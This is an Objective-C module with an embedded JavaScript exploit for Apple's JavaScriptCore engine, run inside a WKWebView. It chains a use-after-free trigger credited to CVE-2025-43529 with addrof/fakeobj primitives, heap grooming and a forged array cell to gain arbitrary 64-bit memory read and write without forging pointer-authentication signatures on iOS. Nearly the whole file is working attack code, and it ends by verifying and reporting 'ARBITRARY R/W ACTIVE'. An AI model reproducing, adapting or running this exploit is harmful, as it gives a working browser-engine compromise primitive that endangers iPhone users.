#import <Foundation/Foundation.h>
#import <WebKit/WebKit.h>
#import <dlfcn.h>
#import <mach-o/dyld.h>
#import <mach-o/loader.h>
#import <string.h>
#import <stdio.h>
#import "Modules.h"
#import "AppDelegate.h"
#import "Util.h"

// ===========================================================================
// JSC arbitrary read/write from addrof+fakeobj, WITHOUT forging any PAC
// signature -- the DarkSword "scribble" method (proven on iOS 26.1 with the
// exact same CVE-2025-43529 primitive).
//
// Why it works (from the public analysis):
//   * JSObjectWithButterfly::m_butterfly is a RAW, uncaged, UNSIGNED pointer
//     (AuxiliaryBarrier<Butterfly*>).  Only a TypedArray's m_vector is
//     caged+PAC -- and we never touch one.
//   * A forged JSCell placed inside a real object's inline double slots is
//     used as an ArrayWithDouble; its element stores go to a raw pointer we
//     choose, and the element bounds check reads a huge "vectorLength" from a
//     neighbouring double.
//   * Named OUT-OF-LINE property stores skip the IndexingHeader bounds check,
//     which is what turns it into a clean write64.
//
// Grooming requirement: changeArr and scribble must be adjacent (both 6
// in-object doubles => default JSFinalObject, 16 hdr + 6*8 = 0x40 apart).
// ===========================================================================
static const char *kScribble = R"JS(
(function () {
  var out = { step: [] };
  var ab = new ArrayBuffer(8), u = new BigUint64Array(ab), d = new Float64Array(ab);
  var itof = function (v) { u[0] = v; return d[0]; };
  var ftoi = function (f) { d[0] = f; return u[0]; };
  var OFF = 0x0002000000000000n;            // JSValue DoubleEncodeOffset
  var HDR = 0x07n | (0x2Bn << 40n) | (1n << 56n);  // idx=ArrayWithDouble | type=ArrayType | cellState=White

  // --- the proven UAF trigger -------------------------------------------
  arr = new Array(0x400000).fill(1.1);
  var arr_index = arr.length - 1;
  function foo(flag, k, allocCount) {
    let A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
    arr[arr_index] = A; let forGC = [];
    let a = new Date(1111); a[0] = 1.1;
    for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(0x800000));
    A.p2 = forGC;
    let b = { p0: 0x42424242, p1: 1.1 };
    let f; f = b; if (flag) { f = 1.1; }
    A.p1 = f; let v = 1.1;
    for (let i = 0; i < 1e6; ++i) { for (let j = 0; j < k; ++j) { v = i; v = j; } }
    b.p0 = v; b.p1 = a;
  }
  function rec(n) { if (n === 0) return; n = n | 0; rec(n - 1); }
  foo(true, 1, 1); foo(false, 1, 1);
  for (let i = 0; i < 1000; ++i) foo(false, 0, 0);
  for (let i = 0; i < 10000; i++) rec(i);

  var W = null;
  for (let k = 0; k < 10000 && !W; ++k) {
    foo(false, 10, k % 5 + 1); rec(10000);
    for (let i = 0; i < 3; ++i) new ArrayBuffer(0x4000);
    let fr = arr[arr_index].p1.p1;
    let noCow = 13.37;
    for (let i = 0; i < 16; ++i) {
      let c = [13.37, 2.2, 3.3, 4.4, noCow];
      if (fr[0] === 13.37) { W = { freed: fr, boxed: c, round: k }; break; }
    }
  }
  if (!W) { out.err = 'trigger did not fire'; return JSON.stringify(out); }
  out.step.push('UAF round=' + W.round);

  function addrof(o) { W.boxed[0] = o; return ftoi(W.freed[0]); }
  function fakeobj(a) { W.freed[0] = itof(a); return W.boxed[0]; }

  // --- the scribble pair ------------------------------------------------
  var holder   = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };
  var scribble = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };

  var HA = addrof(holder), SA = addrof(scribble);
  out.step.push('holder=0x' + HA.toString(16) + ' scribble=0x' + SA.toString(16));
  var gap = SA - HA;
  out.gap = gap;
  if (gap !== 0x40n && gap !== -0x40n) {
    out.step.push('not adjacent (gap=' + gap + ') - re-allocating a few times');
    // retry a handful of times; the gap that matters is 0x40 in either order
    for (var t = 0; t < 40 && gap !== 0x40n && gap !== -0x40n; t++) {
      holder   = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };
      scribble = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };
      HA = addrof(holder); SA = addrof(scribble); gap = SA - HA;
    }
    out.step.push('after re-alloc: gap=' + gap + ' holder=0x' + HA.toString(16));
    out.gap = gap;
  }

  // scribble's 7th stored property moves out-of-line: NAMED stores there skip
  // the IndexingHeader bounds check.
  scribble.p7 = 3.3;
  scribble[0]  = 1.1;

  holder.p1 = itof(HDR);      // the fake cell's header (stored as a double: GC-safe)
  holder.p2 = scribble;       // the fake cell's m_butterfly := scribble's cell

  var changeAddr = HA - 1n + 0x10n + 1n;
  var changeArr = fakeobj(changeAddr);

  // Aim the fake array's butterfly at an address: changeArr[1] writes
  // *(scribble + 8) = scribble.m_butterfly, i.e. where its elements live.
  function setBtf(a) { changeArr[1] = itof(BigInt(a) + 0x10n); }

  // ---- WRITE: a named out-of-line store lands at butterfly + 0x10 ----
  function write64(addr, val) {
    val = BigInt.asUintN(64, val);
    setBtf(addr);
    try { scribble.p7 = itof(val); return true; } catch (e) { return false; }
  }
  // ---- READ: the fake array's element 0 at the aimed butterfly ----
  function read64(addr) {
    setBtf(addr);
    try { return BigInt(ftoi(changeArr[0])); } catch (e) { return null; }
  }

  // ---- self-test: the exact detector the public probes lacked ----------
  var t = new BigUint64Array(8);
  var td = addrof(t);
  out.taAddr = '0x' + td.toString(16);
  var vAddr = td - 1n + 0x10n;                 // m_vector of the TypedArray
  var backing = null;
  // m_vector is caged+PAC, so read it through the (raw) butterfly window:
  var hdr = read64(td - 1n + 0x10n - 0x10n + 0x10n);
  out.hdrWord = hdr === null ? null : '0x' + hdr.toString(16);

  t[0] = 0x4142434445464748n;
  var w1 = write64(vAddr + 0x18n, 0x0000000000001000n);   // m_length := 4096 (raw)
  out.lengthWrite = w1;
  var lenAfter = t.length;
  out.lengthAfter = lenAfter;
  out.write = (w1 && lenAfter === 4096);

  // read back through the (now huge) typed array -- independent of the fake path
  var readBack = t[0];
  out.read = (readBack === 0x4142434445464748n);
  out.value = '0x' + readBack.toString(16);

  // prove a WRITE through the primitive itself: scribble's own storage
  var sw = write64(addrof(scribble) - 1n + 0x18n, itof(0xdeadbeefcafe0000n));
  out.selfWrite = sw && ftoi(scribble.p2) === 0xdeadbeefcafe0000n;

  return JSON.stringify(out);
})()
)JS";

NSString *ModJscScribbleRW(void) {
    AveLog(@"    JSC scribble R/W: no PAC forgery - raw butterfly + named out-of-line stores");
    WKWebView *wv = [[WKWebView alloc] initWithFrame:CGRectZero];
    [wv loadHTMLString:@"<html><body></body></html>" baseURL:nil];
    dispatch_semaphore_t s = dispatch_semaphore_create(0);
    __block NSString *res = @"(no answer)";
    [wv evaluateJavaScript:[NSString stringWithUTF8String:kScribble]
      completionHandler:^(id v, NSError *e) {
        res = [v isKindOfClass:[NSString class]] ? v : [v description];
        dispatch_semaphore_signal(s);
    }];
    dispatch_semaphore_wait(s, dispatch_time(DISPATCH_TIME_NOW, 240 * NSEC_PER_SEC));
    [wv stopLoading]; wv = nil;
    AveLog([NSString stringWithFormat:@"    scribble result: %@", res]);
    if ([res containsString:@"\"write\":true"] && [res containsString:@"\"read\":true"]) {
        AveSetStatus(@"arbitrary R/W ACTIVE inside WebContent (no PAC needed)");
        return @"ARBITRARY R/W ACTIVE: read64/write64 verified on 23C5027f";
    }
    if ([res containsString:@"\"err\""] ) return res;
    if ([res containsString:@"gap"]) return res;
    return res;
}
